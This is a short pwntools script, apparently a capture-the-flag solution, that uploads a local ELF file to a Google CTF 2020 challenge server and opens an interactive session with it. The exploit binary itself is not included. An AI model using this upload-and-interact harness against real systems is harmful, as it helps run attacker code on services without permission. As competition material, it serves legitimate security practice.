from pwn import *

fd = open("binary","r").read()
io = remote("echo.2020.ctfcompetition.com",1337)
io.recvuntil("len(ELF) u32le || ELF:")
io.send(p32(len(fd)))
io.send(fd)
io.interactive()
